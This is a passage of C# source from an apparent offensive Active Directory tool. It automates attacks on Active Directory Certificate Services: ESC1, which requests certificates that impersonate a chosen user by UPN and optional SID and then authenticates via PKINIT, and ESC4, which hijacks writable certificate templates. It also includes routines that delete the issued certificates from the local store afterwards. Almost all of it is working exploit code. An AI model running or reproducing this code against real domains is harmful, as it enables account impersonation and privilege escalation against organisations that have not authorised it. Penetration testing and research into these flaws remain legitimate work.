            // Inner OID: 1.3.6.1.4.1.311.25.2.1 (szOID_NTDS_OBJECTSID)
            byte[] innerOidBytes = new byte[] { 0x06, 0x0B, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02, 0x01 };

            // OCTET STRING containing SID
            List<byte> octetString = new List<byte>();
            octetString.Add(0x04);
            octetString.AddRange(EncodeLength(sidBytes.Length));
            octetString.AddRange(sidBytes);

            // Context [0] containing OCTET STRING
            List<byte> context0 = new List<byte>();
            context0.Add(0xA0);
            context0.AddRange(EncodeLength(octetString.Count));
            context0.AddRange(octetString);

            // Inner SEQUENCE { OID, context[0] }
            List<byte> innerSeq = new List<byte>();
            innerSeq.AddRange(innerOidBytes);
            innerSeq.AddRange(context0);

            List<byte> innerSeqFull = new List<byte>();
            innerSeqFull.Add(0x30);
            innerSeqFull.AddRange(EncodeLength(innerSeq.Count));
            innerSeqFull.AddRange(innerSeq);

            // Outer SEQUENCE containing inner sequence
            List<byte> result = new List<byte>();
            result.Add(0x30);
            result.AddRange(EncodeLength(innerSeqFull.Count));
            result.AddRange(innerSeqFull);

            return result.ToArray();
        }

        
        /// Build the value for szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2)
        /// Format: OCTET STRING containing binary SID
        private static byte[] BuildSidExtensionValue(string sidString)
        {
            // Get binary SID
            var sid = new System.Security.Principal.SecurityIdentifier(sidString);
            byte[] sidBytes = new byte[sid.BinaryLength];
            sid.GetBinaryForm(sidBytes, 0);

            // Build OCTET STRING containing SID
            List<byte> result = new List<byte>();
            result.Add(0x04); // OCTET STRING tag
            result.AddRange(EncodeLength(sidBytes.Length));
            result.AddRange(sidBytes);

            return result.ToArray();
        }

        
        /// Build full OtherName ASN.1 structure for SID extension
        /// Format: [0] { SEQUENCE { OID 1.3.6.1.4.1.311.25.2, [0] { OCTET STRING { SID } } } }
        private static byte[] BuildFullOtherNameValue(string sidString)
        {
            // Get binary SID
            var sid = new System.Security.Principal.SecurityIdentifier(sidString);
            byte[] sidBytes = new byte[sid.BinaryLength];
            sid.GetBinaryForm(sidBytes, 0);

            // OID 1.3.6.1.4.1.311.25.2 encoded as DER
            byte[] oidBytes = new byte[] { 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02 };

            // OCTET STRING with SID
            List<byte> octetString = new List<byte>();
            octetString.Add(0x04);
            octetString.AddRange(EncodeLength(sidBytes.Length));
            octetString.AddRange(sidBytes);

            // Context [0] containing OCTET STRING
            List<byte> context0 = new List<byte>();
            context0.Add(0xA0);
            context0.AddRange(EncodeLength(octetString.Count));
            context0.AddRange(octetString);

            // SEQUENCE { OID, context[0] }
            List<byte> sequence = new List<byte>();
            sequence.AddRange(oidBytes);
            sequence.AddRange(context0);

            List<byte> finalSequence = new List<byte>();
            finalSequence.Add(0x30);
            finalSequence.AddRange(EncodeLength(sequence.Count));
            finalSequence.AddRange(sequence);

            return finalSequence.ToArray();
        }

        private static byte[] EncodeLength(int length)
        {
            if (length < 128)
            {
                return new byte[] { (byte)length };
            }
            else if (length < 256)
            {
                return new byte[] { 0x81, (byte)length };
            }
            else
            {
                return new byte[] { 0x82, (byte)(length >> 8), (byte)(length & 0xFF) };
            }
        }

        
        /// Create PFX file - in .NET Framework 4.8 we need to use the fallback method
        private static bool CreatePFXWithoutInstall(string certDataBase64, dynamic privateKeyObj, string pfxPath, string password)
        {
            // In .NET Framework 4.8, direct PFX creation without certificate store is complex
            // We'll use the fallback method which temporarily installs and immediately removes
            return false;
        }

        public static string RequestCertificateAuto()
        {
            return RequestCertificateAuto(null, null, null, false, false);
        }

        public static string RequestCertificateAuto(string targetUserOverride, string targetUpnOverride, string templateOverride, bool includeSID, bool quiet = false)
        {
            if (!quiet) Console.WriteLine("[*] Request Certificate - AUTO MODE (ESC1 Exploitation)\n");

            try
            {
                // Auto-detect everything
                string caName = DetectCertificateAuthority();
                string currentUser = GetCurrentUsername();
                string defaultDomain = GetCurrentDomain();
                List<string> availableTemplates = GetVulnerableTemplates();

                // Use overrides if provided
                string targetUser = !string.IsNullOrEmpty(targetUserOverride) ? targetUserOverride : currentUser;
                string targetUPN = !string.IsNullOrEmpty(targetUpnOverride) ? targetUpnOverride : $"{targetUser}@{defaultDomain}";
                string templateName = !string.IsNullOrEmpty(templateOverride) ? templateOverride :
                    (availableTemplates.Count > 0 ? availableTemplates[0] : "User");

                OutputHelper.Verbose("[*] Auto-detected parameters:");
                OutputHelper.Verbose($"    CA: {caName ?? "Not detected"}");
                OutputHelper.Verbose($"    Template: {templateName}");
                if (!quiet) Console.WriteLine($"[*] Target User: {targetUser}");
                OutputHelper.Verbose($"    Target UPN: {targetUPN}");
                OutputHelper.Verbose($"    Domain: {defaultDomain}");
                OutputHelper.Verbose($"    Include SID: {includeSID}");
                if (availableTemplates.Count > 0)
                {
                    OutputHelper.Verbose($"    Available Templates: {string.Join(", ", availableTemplates.Take(5))}");
                }
                OutputHelper.Verbose("");

                // Validate
                if (string.IsNullOrWhiteSpace(caName))
                {
                    Console.WriteLine("[!] Could not auto-detect Certificate Authority.");
                    Console.WriteLine("[!] Please ensure you have access to AD CS and try again.");
                    return null;
                }

                if (string.IsNullOrWhiteSpace(targetUser) || string.IsNullOrWhiteSpace(targetUPN))
                {
                    Console.WriteLine("[!] Could not determine user information.");
                    return null;
                }

                OutputHelper.Verbose("[*] Proceeding with auto-detected parameters...\n");

                // Call the existing method with auto-detected parameters
                return RequestCertificateWithParams(caName, templateName, targetUser, targetUPN, includeSID, quiet);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error in auto mode: {ex.Message}");
                Console.WriteLine($"[!] Stack Trace: {ex.StackTrace}");
                return null;
            }
        }

        public static void RequestCertificate()
        {
            Console.WriteLine("[*] Request Certificate (ESC1 Exploitation) - Interactive Mode\n");

            try
            {
                // Auto-detect defaults
                string defaultCA = DetectCertificateAuthority();
                string defaultUser = GetCurrentUsername();
                string defaultDomain = GetCurrentDomain();
                string defaultUPN = $"{defaultUser}@{defaultDomain}";
                List<string> availableTemplates = GetVulnerableTemplates();
                string defaultTemplate = availableTemplates.Count > 0 ? availableTemplates[0] : "User";

                OutputHelper.Verbose("[*] Auto-detected defaults:");
                OutputHelper.Verbose($"    CA: {defaultCA ?? "Not detected"}");
                OutputHelper.Verbose($"    Domain: {defaultDomain}");
                OutputHelper.Verbose($"    Current User: {defaultUser}");
                if (availableTemplates.Count > 0)
                {
                    OutputHelper.Verbose($"    Available Templates: {string.Join(", ", availableTemplates.Take(5))}");
                }
                OutputHelper.Verbose("");

                // Get CA name with default
                Console.Write($"Enter CA name [default: {defaultCA ?? "DC01\\CA"}]: ");
                string caName = Console.ReadLine()?.Trim();
                if (string.IsNullOrWhiteSpace(caName))
                {
                    caName = defaultCA;
                    if (string.IsNullOrWhiteSpace(caName))
                    {
                        Console.WriteLine("[!] Could not auto-detect CA. Please enter manually.");
                        Console.Write("Enter CA name (e.g., DC01\\EVILCORP-CA): ");
                        caName = Console.ReadLine()?.Trim();
                    }
                }

                // Get template name with default
                Console.Write($"Enter certificate template name [default: {defaultTemplate}]: ");
                string templateName = Console.ReadLine()?.Trim();
                if (string.IsNullOrWhiteSpace(templateName))
                {
                    templateName = defaultTemplate;
                }

                // Get target user with default
                Console.Write($"Enter target user SamAccountName [default: {defaultUser}]: ");
                string targetUser = Console.ReadLine()?.Trim();
                if (string.IsNullOrWhiteSpace(targetUser))
                {
                    targetUser = defaultUser;
                }

                // Get target UPN with default
                string calculatedUPN = $"{targetUser}@{defaultDomain}";
                Console.Write($"Enter target user UPN [default: {calculatedUPN}]: ");
                string targetUPN = Console.ReadLine()?.Trim();
                if (string.IsNullOrWhiteSpace(targetUPN))
                {
                    targetUPN = calculatedUPN;
                }

                // Ask about SID
                Console.Write("Include SID for strong mapping (KB5014754)? [y/N]: ");
                string includeSIDInput = Console.ReadLine()?.Trim();
                bool includeSID = !string.IsNullOrEmpty(includeSIDInput) && includeSIDInput.ToLower() == "y";

                // Final validation
                if (string.IsNullOrWhiteSpace(caName) || string.IsNullOrWhiteSpace(templateName) ||
                    string.IsNullOrWhiteSpace(targetUser) || string.IsNullOrWhiteSpace(targetUPN))
                {
                    Console.WriteLine("[!] Error: Could not determine all required parameters.");
                    return;
                }

                Console.WriteLine();

                // Call the main implementation
                string pfxPath = RequestCertificateWithParams(caName, templateName, targetUser, targetUPN, includeSID);

                // Ask if user wants to authenticate via PKINIT
                if (!string.IsNullOrEmpty(pfxPath))
                {
                    Console.Write("\n[?] Do you want to authenticate via PKINIT now? (y/n): ");
                    string pkinitChoice = Console.ReadLine()?.Trim().ToLower();

                    if (pkinitChoice == "y" || pkinitChoice == "yes")
                    {
                        Console.WriteLine($"\n[*] Authenticating as {targetUser} using PKINIT...\n");
                        PkinitAuth.AskTgt(pfxPath, "", null, targetUser, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        private static void RequestCertificateViaCommand(string caName, string templateName, string targetUser, string targetUPN, string targetSID)
        {
            Console.WriteLine("[*] Using certreq.exe fallback method...");
            Console.WriteLine("[!] This method requires manual INF file creation.");
            Console.WriteLine($@"
Create an INF file with the following content:

[Version]
Signature = ""$Windows NT$""

[NewRequest]
Subject = ""CN={targetUser}""
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
ProviderName = ""Microsoft RSA SChannel Cryptographic Provider""
RequestType = PKCS10

[Extensions]
2.5.29.17 = ""{{text}}""
_continue_ = ""upn={targetUPN}&""

[RequestAttributes]
CertificateTemplate = ""{templateName}""

Then run:
  certreq -new request.inf request.req
  certreq -submit -config ""{caName}"" request.req cert.cer
  certreq -accept cert.cer
");
        }

        private static string GetUserSID(string samAccountName)
        {
            try
            {
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = $"(&(objectClass=user)(samAccountName={samAccountName}))";
                searcher.PropertiesToLoad.Add("objectSid");

                SearchResult result = searcher.FindOne();
                if (result != null && result.Properties["objectSid"].Count > 0)
                {
                    byte[] sidBytes = (byte[])result.Properties["objectSid"][0];
                    return new System.Security.Principal.SecurityIdentifier(sidBytes, 0).ToString();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error getting SID: {ex.Message}");
            }

            return null;
        }

        
        /// Submit certificate request using DCOM ICertRequestD2 (like Certify does)
        /// This works without RSAT installed
        
        private static int SubmitCertRequestDCOM(string caName, string certRequest, string attributes, out string certData)
        {
            certData = null;

            // Parse CA name: "server\CAName" format
            string[] caParts = caName.Split('\\');
            if (caParts.Length != 2)
            {
                Console.WriteLine($"[!] Invalid CA name format: {caName}. Expected: server\\CAName");
                return 0;
            }
            string caServer = caParts[0];
            string caNameOnly = caParts[1];

            try
            {
                // Create DCOM connection to the CA
                // CLSID for CertRequestD: {d99e6e74-fc88-11d0-b498-00a0c90312f3}
                Guid clsid = new Guid("d99e6e74-fc88-11d0-b498-00a0c90312f3");

                // Create the type from CLSID
                Type certRequestDType = Type.GetTypeFromCLSID(clsid, caServer, true);
                if (certRequestDType == null)
                {
                    OutputHelper.Verbose("[!] Could not get ICertRequestD type");
                    return 0;
                }

                // Create instance on remote server
                OutputHelper.Verbose($"[*] Connecting to CA via DCOM: {caServer}");
                dynamic certRequestD = Activator.CreateInstance(certRequestDType);

                // Convert request to binary
                byte[] requestBytes = Convert.FromBase64String(certRequest);

                // Call Request method
                // Parameters: dwFlags, pwszAuthority, pdwRequestId, pdwDisposition, pwszAttributes, pctbRequest, pctbCertChain, pctbEncodedCert, pctbDispositionMessage
                int requestId = 0;
                int disposition = 0;

                // CR_IN_BASE64 = 1, CR_IN_PKCS10 = 0x100
                int flags = 0x1 | 0x100; // CR_IN_BASE64 | CR_IN_PKCS10

                OutputHelper.Verbose($"[*] Submitting request to CA: {caNameOnly}");

                // Use ICertRequestD2::Request2 method
                try
                {
                    // The Request method signature varies, try the simple approach first
                    object result = certRequestD.Request(
                        flags,
                        caNameOnly,
                        ref requestId,
                        ref disposition,
                        attributes,
                        certRequest
                    );

                    OutputHelper.Verbose($"[*] Request ID: {requestId}, Disposition: {disposition}");

                    if (disposition == 3) // CR_DISP_ISSUED
                    {
                        // Get the certificate
                        certData = certRequestD.GetCertificate(1); // CR_OUT_BASE64
                    }

                    return disposition;
                }
                catch (Exception reqEx)
                {
                    OutputHelper.Verbose($"[*] Request method failed: {reqEx.Message}");

                    // Try alternative approach using Submit
                    try
                    {
                        disposition = certRequestD.Submit(flags, certRequest, attributes, $"{caServer}\\{caNameOnly}");
                        if (disposition == 3)
                        {
                            certData = certRequestD.GetCertificate(1);
                        }
                        return disposition;
                    }
                    catch
                    {
                        throw reqEx;
                    }
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] DCOM error: {ex.Message}");
                throw;
            }
        }

        
        /// Submit certificate request using certreq.exe (for non-domain-joined machines)
        
        private static string SubmitViaCertreq(string base64Request, string caName, string templateName, out string certData)
        {
            certData = null;
            string tempDir = Path.GetTempPath();
            string reqFile = Path.Combine(tempDir, $"spicyad_{Guid.NewGuid():N}.req");
            string cerFile = Path.Combine(tempDir, $"spicyad_{Guid.NewGuid():N}.cer");

            try
            {
                // Write the request to a temp file
                File.WriteAllText(reqFile, $"-----BEGIN CERTIFICATE REQUEST-----\r\n{base64Request}\r\n-----END CERTIFICATE REQUEST-----");

                // Build certreq command
                // Format: certreq -submit -config "server\CAName" -attrib "CertificateTemplate:TemplateName" request.req cert.cer
                string certreqArgs = $"-submit -config \"{caName}\" -attrib \"CertificateTemplate:{templateName}\" \"{reqFile}\" \"{cerFile}\"";

                OutputHelper.Verbose($"[*] Running: certreq {certreqArgs}");

                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "certreq.exe",
                    Arguments = certreqArgs,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var process = System.Diagnostics.Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit(60000); // 60 second timeout

                    OutputHelper.Verbose($"[*] certreq output: {output}");
                    if (!string.IsNullOrEmpty(error))
                    {
                        OutputHelper.Verbose($"[*] certreq error: {error}");
                    }

                    // Check if certificate was issued
                    if (File.Exists(cerFile) && new FileInfo(cerFile).Length > 0)
                    {
                        // Read the certificate
                        string cerContent = File.ReadAllText(cerFile);
                        // Extract base64 content
                        if (cerContent.Contains("-----BEGIN CERTIFICATE-----"))
                        {
                            int start = cerContent.IndexOf("-----BEGIN CERTIFICATE-----") + 27;
                            int end = cerContent.IndexOf("-----END CERTIFICATE-----");
                            certData = cerContent.Substring(start, end - start).Replace("\r", "").Replace("\n", "");
                        }
                        else
                        {
                            certData = Convert.ToBase64String(File.ReadAllBytes(cerFile));
                        }
                        return "issued";
                    }
                    else if (output.Contains("pending") || output.Contains("taken under submission"))
                    {
                        return "pending";
                    }
                    else
                    {
                        return $"Failed: {output} {error}";
                    }
                }
            }
            catch (Exception ex)
            {
                return $"Exception: {ex.Message}";
            }
            finally
            {
                // Cleanup temp files
                try { if (File.Exists(reqFile)) File.Delete(reqFile); } catch { }
                try { if (File.Exists(cerFile)) File.Delete(cerFile); } catch { }
            }
        }

        private static string DetectCertificateAuthority()
        {
            try
            {
                OutputHelper.Verbose("[*] Detecting Certificate Authorities...");
                OutputHelper.Verbose($"[*] IsDomainJoined: {AuthContext.IsDomainJoined}, UseAltCreds: {AuthContext.UseAlternateCredentials}, DcIp: {AuthContext.DcIp ?? "null"}");

                DirectoryEntry rootDSE = AuthContext.GetRootDSE();
                string configNC = rootDSE.Properties["configurationNamingContext"][0].ToString();
                OutputHelper.Verbose($"[*] ConfigNC: {configNC}");

                string pkiPath = $"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,{configNC}";
                OutputHelper.Verbose($"[*] PKI Path: {pkiPath}");

                DirectoryEntry pkiEntry = AuthContext.GetDirectoryEntry(pkiPath);
                DirectorySearcher caSearcher = new DirectorySearcher(pkiEntry);
                caSearcher.Filter = "(objectClass=pKIEnrollmentService)";
                caSearcher.PropertiesToLoad.Add("cn");
                caSearcher.PropertiesToLoad.Add("dNSHostName");

                SearchResultCollection cas = caSearcher.FindAll();
                if (cas.Count > 0)
                {
                    SearchResult firstCA = cas[0];
                    string caName = firstCA.Properties["cn"][0].ToString();
                    string dnsHostName = firstCA.Properties["dNSHostName"][0].ToString();

                    // Always use the CA's actual hostname - resolve via DNS if needed
                    // The CA may be on a different server than the DC
                    string caServer = dnsHostName;

                    // Try to resolve CA hostname to IP using DNS server or DC IP
                    string dnsToUse = AuthContext.DnsServer ?? AuthContext.DcIp;
                    if (!string.IsNullOrEmpty(dnsToUse))
                    {
                        try
                        {
                            string caIp = ResolveDnsName(dnsHostName, dnsToUse);
                            if (!string.IsNullOrEmpty(caIp))
                            {
                                caServer = caIp;
                                OutputHelper.Verbose($"[*] Resolved CA {dnsHostName} to {caIp}");
                            }
                            else
                            {
                                // If CA is on the same server as DC, use DC IP
                                OutputHelper.Verbose($"[*] Could not resolve CA hostname, trying DC IP...");
                                caServer = AuthContext.DcIp ?? dnsHostName;
                            }
                        }
                        catch
                        {
                            // Fallback to DC IP if resolution fails
                            OutputHelper.Verbose($"[*] DNS resolution failed, using DC IP as CA server");
                            caServer = AuthContext.DcIp ?? dnsHostName;
                        }
                    }

                    string fullCAName = $"{caServer}\\{caName}";
                    OutputHelper.Verbose($"[+] Found CA: {fullCAName}");
                    return fullCAName;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error detecting CA: {ex.Message}");
            }

            return null;
        }

        
        /// Resolve DNS name using a specific DNS server
        
        private static string ResolveDnsName(string hostname, string dnsServer)
        {
            try
            {
                // Use nslookup to resolve with specific DNS server
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "nslookup",
                    Arguments = $"{hostname} {dnsServer}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var process = System.Diagnostics.Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit(5000);

                    // Parse nslookup output for IP address
                    // Format: "Address: x.x.x.x" after the DNS server info
                    var lines = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    bool foundName = false;
                    foreach (var line in lines)
                    {
                        if (line.Contains(hostname))
                            foundName = true;

                        if (foundName && line.StartsWith("Address:"))
                        {
                            string ip = line.Replace("Address:", "").Trim();
                            // Skip IPv6 addresses
                            if (!ip.Contains(":"))
                                return ip;
                        }
                    }
                }
            }
            catch { }

            return null;
        }

        private static string GetCurrentUsername()
        {
            try
            {
                return System.Security.Principal.WindowsIdentity.GetCurrent().Name.Split('\\').LastOrDefault();
            }
            catch
            {
                return Environment.UserName;
            }
        }

        private static string GetCurrentDomain()
        {
            try
            {
                // Try using IPGlobalProperties first - most reliable
                string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                if (!string.IsNullOrEmpty(domainName))
                {
                    return domainName;
                }
            }
            catch { }

            try
            {
                // Parse from LDAP path
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(objectClass=domainDNS)";
                searcher.PropertiesToLoad.Add("distinguishedName");

                SearchResult result = searcher.FindOne();
                if (result != null && result.Properties["distinguishedName"].Count > 0)
                {
                    string dn = result.Properties["distinguishedName"][0].ToString();
                    // Parse DC=evilcorp,DC=local to evilcorp.local
                    var parts = dn.Split(',')
                        .Where(p => p.StartsWith("DC=", StringComparison.OrdinalIgnoreCase))
                        .Select(p => p.Substring(3));
                    return string.Join(".", parts);
                }
            }
            catch { }

            try
            {
                // Fallback to environment
                return Environment.UserDomainName.ToLower() + ".local";
            }
            catch
            {
                return "domain.local";
            }
        }

        private static List<string> GetVulnerableTemplates()
        {
            List<string> templates = new List<string>();
            try
            {
                DirectoryEntry rootDSE = AuthContext.GetRootDSE();
                string configNC = rootDSE.Properties["configurationNamingContext"][0].ToString();

                DirectoryEntry pkiEntry = AuthContext.GetDirectoryEntry($"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,{configNC}");
                DirectorySearcher templateSearcher = new DirectorySearcher(pkiEntry);
                templateSearcher.Filter = "(objectClass=pKICertificateTemplate)";
                templateSearcher.PropertiesToLoad.Add("cn");
                templateSearcher.PropertiesToLoad.Add("displayName");
                templateSearcher.PropertiesToLoad.Add("msPKI-Certificate-Name-Flag");
                templateSearcher.PropertiesToLoad.Add("pKIExtendedKeyUsage");

                SearchResultCollection results = templateSearcher.FindAll();
                foreach (SearchResult template in results)
                {
                    templates.Add(template.Properties["cn"][0].ToString());
                }
            }
            catch { }

            return templates;
        }

        private static byte[] ConvertSIDStringToBinary(string sidString)
        {
            try
            {
                System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(sidString);
                byte[] sidBytes = new byte[sid.BinaryLength];
                sid.GetBinaryForm(sidBytes, 0);
                return sidBytes;
            }
            catch
            {
                return null;
            }
        }

        private static void CleanupInstalledCertificate(string targetUser)
        {
            X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadWrite);

            // Find certificates for this user created in the last minute
            X509Certificate2Collection certs = store.Certificates.Find(
                X509FindType.FindBySubjectDistinguishedName,
                $"CN={targetUser}",
                false);

            foreach (X509Certificate2 cert in certs)
            {
                // Only remove if it was just created (within last 2 minutes)
                if ((DateTime.Now - cert.NotBefore).TotalMinutes < 2)
                {
                    store.Remove(cert);
                    Console.WriteLine($"[*] Cleaned up certificate from store: {cert.Thumbprint}");
                }
            }

            store.Close();
        }

        private static void ExportAndCleanupFromStore(string targetUser, string pfxFile, string password)
        {
            X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadWrite);

            try
            {
                // Find the most recently created certificate for this user
                X509Certificate2Collection certs = store.Certificates.Find(
                    X509FindType.FindBySubjectDistinguishedName,
                    $"CN={targetUser}",
                    false);

                if (certs.Count == 0)
                {
                    throw new Exception($"Certificate for {targetUser} not found in store");
                }

                // Sort by NotBefore (newest first)
                var sortedCerts = certs.Cast<X509Certificate2>()
                    .OrderByDescending(c => c.NotBefore)
                    .ToList();

                X509Certificate2 cert = sortedCerts[0];

                if (!cert.HasPrivateKey)
                {
                    throw new Exception("Certificate does not have a private key");
                }

                // Export to PFX
                byte[] pfxBytes = cert.Export(X509ContentType.Pfx, password);
                File.WriteAllBytes(pfxFile, pfxBytes);
                Console.WriteLine($"[+] PFX exported from store");

                // Cleanup - remove from store
                store.Remove(cert);
                Console.WriteLine($"[+] Certificate removed from store: {cert.Thumbprint}");
            }
            finally
            {
                store.Close();
            }
        }

        private static void ExportPFXFromStore(string targetUser, string password)
        {
            X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadOnly);

            // Find the most recently created certificate for this user
            X509Certificate2Collection certs = store.Certificates.Find(
                X509FindType.FindBySubjectDistinguishedName,
                $"CN={targetUser}",
                false);

            if (certs.Count == 0)
            {
                store.Close();
                throw new Exception($"Certificate for {targetUser} not found in store");
            }

            // Sort by NotBefore (newest first)
            var sortedCerts = certs.Cast<X509Certificate2>()
                .OrderByDescending(c => c.NotBefore)
                .ToList();

            X509Certificate2 cert = sortedCerts[0];

            if (!cert.HasPrivateKey)
            {
                store.Close();
                throw new Exception("Certificate does not have a private key");
            }

            // Export with private key (no console output - handled by caller)
            byte[] pfxBytes = cert.Export(X509ContentType.Pfx, password);
            string pfxFile = $"cert_{targetUser}_{DateTime.Now:yyyyMMdd_HHmmss}.pfx";
            System.IO.File.WriteAllBytes(pfxFile, pfxBytes);

            store.Close();
        }

        private static string ReadPassword()
        {
            // Show input so user can verify what they're typing
            return Console.ReadLine()?.Trim() ?? "";
        }

        #region ESC4 Exploitation

        
        /// Interactive menu for ESC4 exploitation
        public static void ExploitESC4Interactive()
        {
            Console.WriteLine("\n[*] ESC4 Exploitation - Template Hijacking\n");
            Console.WriteLine("========== ESC4 MENU ==========");
            Console.WriteLine("[1] Backup Template Configuration");
            Console.WriteLine("[2] Modify Template to ESC1 (Enable Subject Alt Name + Domain Users Enroll)");
            Console.WriteLine("[3] Restore Template from Backup");
            Console.WriteLine("[4] List Available ESC4 Templates");
            Console.WriteLine("[0] Back\n");

            Console.Write("Select an option: ");
            string choice = Console.ReadLine()?.Trim();

            switch (choice)
            {
                case "1":
                    Console.Write("\nEnter template name (CN): ");
                    string backupTemplate = Console.ReadLine()?.Trim();
                    if (!string.IsNullOrEmpty(backupTemplate))
                    {
                        BackupTemplateConfiguration(backupTemplate);
                    }
                    break;

                case "2":
                    Console.Write("\nEnter template name (CN): ");
                    string modifyTemplate = Console.ReadLine()?.Trim();
                    if (!string.IsNullOrEmpty(modifyTemplate))
                    {
                        Console.Write("Create backup before modifying? [Y/n]: ");
                        string backupFirst = Console.ReadLine()?.Trim();
                        bool doBackup = string.IsNullOrEmpty(backupFirst) || backupFirst.ToLower() != "n";
                        ModifyTemplateToESC1(modifyTemplate, doBackup);
                    }
                    break;

                case "3":
                    Console.Write("\nEnter backup file path: ");
                    string backupFile = Console.ReadLine()?.Trim();
                    if (!string.IsNullOrEmpty(backupFile))
                    {
                        RestoreTemplateConfiguration(backupFile);
                    }
                    break;

                case "4":
                    ListESC4Templates();
                    break;

                case "0":
                    return;

                default:
                    Console.WriteLine("[!] Invalid option");
                    break;
            }
        }

        
        /// List templates vulnerable to ESC4 (low-priv write access)
        public static void ListESC4Templates()
        {
            Console.WriteLine("\n[*] Searching for ESC4 vulnerable templates (low-priv write access)...\n");

            try
            {
                DirectoryEntry rootDSE = AuthContext.GetRootDSE();
                string configNC = rootDSE.Properties["configurationNamingContext"][0].ToString();

                DirectoryEntry pkiEntry = AuthContext.GetDirectoryEntry($"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,{configNC}");
                DirectorySearcher templateSearcher = new DirectorySearcher(pkiEntry);
                templateSearcher.Filter = "(objectClass=pKICertificateTemplate)";
                templateSearcher.PropertiesToLoad.Add("cn");
                templateSearcher.PropertiesToLoad.Add("displayname");
                templateSearcher.PropertiesToLoad.Add("ntsecuritydescriptor");
                templateSearcher.SecurityMasks = SecurityMasks.Dacl | SecurityMasks.Owner;

                SearchResultCollection templates = templateSearcher.FindAll();
                int esc4Count = 0;

                foreach (SearchResult template in templates)
                {
                    string cn = template.Properties["cn"].Count > 0 ?
                        template.Properties["cn"][0].ToString() : "Unknown";
                    string displayName = template.Properties["displayname"].Count > 0 ?
                        template.Properties["displayname"][0].ToString() : cn;

                    ActiveDirectorySecurity adSecurity = null;
                    if (template.Properties["ntsecuritydescriptor"].Count > 0)
                    {
                        try
                        {
                            byte[] sdBytes = (byte[])template.Properties["ntsecuritydescriptor"][0];
                            adSecurity = new ActiveDirectorySecurity();
                            adSecurity.SetSecurityDescriptorBinaryForm(sdBytes);
                        }
                        catch { }
                    }

                    var lowPrivWritePerms = GetLowPrivWritePermissions(adSecurity);

                    if (lowPrivWritePerms.Count > 0)
                    {
                        esc4Count++;
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"[+] {displayName} (CN={cn})");
                        Console.ResetColor();
                        Console.WriteLine("    Write Permissions:");
                        foreach (var perm in lowPrivWritePerms)
                        {
                            Console.WriteLine($"        - {perm}");
                        }
                        Console.WriteLine();
                    }
                }

                if (esc4Count == 0)
                {
                    Console.WriteLine("[*] No ESC4 vulnerable templates found.");
                }
                else
                {
                    Console.WriteLine($"[+] Found {esc4Count} ESC4 vulnerable templates.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        
        /// Backup certificate template configuration to JSON file
        public static string BackupTemplateConfiguration(string templateName, bool quiet = false)
        {
            if (!quiet) Console.WriteLine($"\n[*] Backing up template configuration: {templateName}\n");

            try
            {
                DirectoryEntry rootDSE = AuthContext.GetRootDSE();
                string configNC = rootDSE.Properties["configurationNamingContext"][0].ToString();

                string templateDN = $"CN={templateName},CN=Certificate Templates,CN=Public Key Services,CN=Services,{configNC}";
                DirectoryEntry templateEntry = AuthContext.GetDirectoryEntry($"LDAP://{templateDN}");

                // Force reload with security descriptor
                templateEntry.RefreshCache(new string[] {
                    "cn", "displayName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
                    "pKIExtendedKeyUsage", "msPKI-Certificate-Application-Policy",
                    "msPKI-RA-Signature", "nTSecurityDescriptor"
                });

                // Create backup object
                TemplateBackup backup = new TemplateBackup
                {
                    TemplateName = templateName,
                    TemplateDN = templateDN,
                    BackupTime = DateTime.Now,
                    ExtendedKeyUsage = new List<string>(),
                    CertificateApplicationPolicy = new List<string>()
                };

                // Get msPKI-Certificate-Name-Flag
                if (templateEntry.Properties["msPKI-Certificate-Name-Flag"].Value != null)
                {
                    backup.CertificateNameFlag = Convert.ToInt32(templateEntry.Properties["msPKI-Certificate-Name-Flag"].Value);
                    if (!quiet) Console.WriteLine($"[*] msPKI-Certificate-Name-Flag: 0x{backup.CertificateNameFlag:X8}");
                }

                // Get msPKI-Enrollment-Flag
                if (templateEntry.Properties["msPKI-Enrollment-Flag"].Value != null)
                {
                    backup.EnrollmentFlag = Convert.ToInt32(templateEntry.Properties["msPKI-Enrollment-Flag"].Value);
